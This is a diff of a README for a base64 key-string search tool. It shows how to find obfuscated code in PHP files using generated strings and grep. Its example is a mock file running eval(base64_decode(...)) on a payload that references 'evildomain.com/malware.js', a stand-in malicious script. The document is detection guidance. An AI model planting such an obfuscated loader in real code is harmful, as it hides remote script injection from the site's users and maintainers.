@@ -28,7 +28,7 @@ aGlzIGZpbGUgd2FzIHBpcGVkIHRvIHN0ZGlu
 
 Test to see if a call to "evildomain.com/malware.js" is present in the following obfuscated file:
 
-'''php
+```php
 <?php
 /* 
  * Totally Legit PHP File
@@ -40,9 +40,9 @@ Test to see if a call to "evildomain.com/malware.js" is present in the following
  // This file is encoded for copyright protection.
  // Don't decode it or I'll sue you.
  eval(base64_decode(Ly8gSGFoYSB0aGV5J2xsIG5ldmVyIGZpbmQgbWUhCmhhY2tpbmdNYWluZnJhbWUoKTsKaW5qZWN0aW5nQ29kZSgpOwpicm93c2VyVGFrZW92ZXIoJ2h0dHA6Ly9ldmlsZG9tYWluLmNvbS9tYWx3YXJlLmpzJyk7));
-'''
+```
 
-'''
+```
 $ base64-keystrings.py "evildomain.com/malware.js"
 ZXZpbGRvbWFpbi5jb20vbWFsd2FyZS5q
 aWxkb21haW4uY29tL21hbHdhcmUu
@@ -54,7 +54,7 @@ $ grep "aWxkb21haW4uY29tL21hbHdhcmUu" badfile.txt
 
 $ grep "dmlsZG9tYWluLmNvbS9tYWx3YXJlLmpz" badfile.txt
 eval(base64_decode(Ly8gSGFoYSB0aGV5J2xsIG5ldmVyIGZpbmQgbWUhCmhhY2tpbmdNYWluZnJhbWUoKTsKaW5qZWN0aW5nQ29kZSgpOwpicm93c2VyVGFrZW92ZXIoJ2h0dHA6Ly9ldmlsZG9tYWluLmNvbS9tYWx3YXJlLmpzJyk7));
-'''
+```
 
 As we can see, the string "dmlsZG9tYWluLmNvbS9tYWx3YXJlLmpz" was identified in the file! Applied against a large PHP framework where a code injection could be in a huge assortment of locations, recursive searches could be performed with the generated key strings to assist in locating obfuscated code. 
 
